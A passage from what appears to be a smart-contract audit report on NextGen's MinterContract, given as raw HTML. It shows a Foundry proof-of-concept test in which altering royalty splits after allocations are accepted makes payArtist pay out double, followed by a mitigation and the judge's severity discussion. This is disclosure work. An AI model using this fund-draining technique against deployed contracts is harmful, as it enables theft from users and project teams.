class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: GPL-3.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">Test</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../lib/forge-std/src/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">NextGenMinterContract</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/MinterContract.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">NextGenAdmins</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/NextGenAdmins.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/INextGenCore.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MinterContractTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">colId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">team</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;team&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">artist</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;artist&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">core</span><span class=\"mtk1\">  = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;core&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;delegate&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">NextGenAdmins</span><span class=\"mtk1\"> </span><span class=\"mtk12\">admin</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenAdmins</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">NextGenMinterContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenMinterContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">retrievewereDataAdded</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">viewMaxAllowance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">retrieveTokensMintedPublicPerAddress</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">viewTokensIndexMin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">viewCirSupply</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">viewTokensIndexMax</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1_000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">retrieveArtistAddress</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">artist</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionCosts</span><span class=\"mtk1\">(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionPhases</span><span class=\"mtk1\">(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">101</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// jump one sec to enter public phase</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testFaultySplitResultsInDoubleRoyalty</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// needs to hold one extra eth for payout</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minter</span><span class=\"mtk1\">),</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// mint to increase collectionTotalAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mint</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minter</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// begin with setting artist split to 100%, team 0%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setPrimaryAndSecondarySplits</span><span class=\"mtk1\">(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// primary</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">  </span><span class=\"mtk3\">// secondary (not used)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// set the actual artist split</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">proposePrimaryAddressesAndPercentages</span><span class=\"mtk1\">(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">artist</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">acceptAddressesAndPercentages</span><span class=\"mtk1\">(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// set 100% to team, 0% to artist without changing artist address allocation</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setPrimaryAndSecondarySplits</span><span class=\"mtk1\">(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// primary</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">  </span><span class=\"mtk3\">// secondary (not used)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// when artist is paid, 2x the amount is paid out</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">payArtist</span><span class=\"mtk1\">(</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">team</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// team gets 1 eth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk12\">team</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// artist gets 1 eth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk12\">artist</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider verifying that the artist allocations add up to the artist percentage when calling <code>payArtist</code>.</p>\n<h3 id=\"assessed-type-4\" style=\"position:relative;\"><a href=\"#assessed-type-4\" aria-label=\"assessed type 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Invalid Validation</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1550#issuecomment-1825358289\">a2rocket (NextGen) disputed and commented via duplicate issue #1550</a></strong>:</p>\n<blockquote>\n<p>The <code>payArtist</code> function allows to payments to artists between phases. Once a payment is made, the <code>collectionAmount</code> goes to <code>0</code> and then increases while the second minting starts, etc.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686#issuecomment-1839570965\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden specifies that an overpayment of artist funds can be performed, resulting in fund loss for the system if the artistâ€™s percentage is ever reduced after having been configured.</p>\n<p>The submission is correct and the core flaw lies in that the <code>MinterContract::payArtist</code> function will utilize the <strong>proposed percentages</strong> instead of the accepted ones when performing the transfers, <strong>incorrectly assuming that they equal the <code>collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage</code> originally enforced when they were set</strong>.</p>\n<p>The Wardenâ€™s submission was selected as the best because it details the attack vector precisely, it includes an informative PoC, and provides an easy-to-follow textual description of the issue.</p>\n<p>I consider this to be a valid medium-severity issue as the fund loss can tap into the funds of other users and potentially the teams themselves given that the royalties for artists are distributed before the royalties for teams.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686#issuecomment-1848617783\">MrPotatoMagic (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xsomeone, here is why I believe this issue in not valid:</p>\n<ol>\n<li>The issue assumes there will be a deviation from the original process of how royalties are set. That is, <code>setPrimaryAndSecondarySplits() => proposePrimaryAddressesAndPercentages() => acceptAddressesAndPercentages</code>.</li>\n<li>The warden mentions that the admin would be malicious or could input by mistake. Such instances are considered reckless admin mistakes as per the <a href=\"https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-severity-standardization-centralization-risks\">C4 SC verdict in the docs</a>.</li>\n<li>There is no incorrect assumption being made by the NextGen team here since the process mentioned in point 1 is to be followed every time royalties are changed. <a href=\"https://discord.com/channels/810916927919620096/1166760088963383336/1169637770155786271\">See Discord comment by sponsor</a>.</li>\n</ol>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686#issuecomment-1848651047\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@MrPotatoMagic, thanks for contributing to this particular submissionâ€™s Post-Judging QA process! Let me get back to each of your points:</p>\n<ol>\n<li>The issue assumes that the artist is willing to break the flow which is a valid assessment.</li>\n<li>The Wardenâ€™s submission does not rely on an egregious error or reckless mistake. It also does not rely on their input being incorrect maliciously as any update to the function will cause the bug to manifest at varying degrees. Invoking <code>setPrimaryAndSecondarySplits</code>, as its name implies, should overwrite the split percentages but it does not. This is a reasonable expectation of the function. </li>\n<li>The submission entails incorrect accounting in the <code>MinterContract</code>, rather than an administrative error. Additionally, its impact is significant, as it can touch into the funds of other collections as all funds are stored under a single contract.</li>\n</ol>\n<p>Combining the facts that this is a <strong>critical vulnerability</strong> with an <strong>acceptable chance of happening</strong>, I consider a medium-risk rating appropriate for it.</p>\n<p>Keep in mind that the <code>payArtist</code> function, while an administrative function, can be assigned to function-level administrators. Contrary to functions like <code>emergencyWithdraw</code> which clearly denote their purpose, the NextGen team will never reasonably expect that <code>payArtist</code> <strong>can result in the contractâ€™s funds being siphoned</strong>.</p>\n<p>As such, the accounting flaw must be corrected and constitutes a medium-risk vulnerability that should be rectified. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-the-randomizervrf-and-randomizerrng-do-not-produce-hash-value\" style=\"position:relative;\"><a href=\"#m-02-the-randomizervrf-and-randomizerrng-do-not-produce-hash-value\" aria-label=\"m 02 the randomizervrf and randomizerrng do not produce hash value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 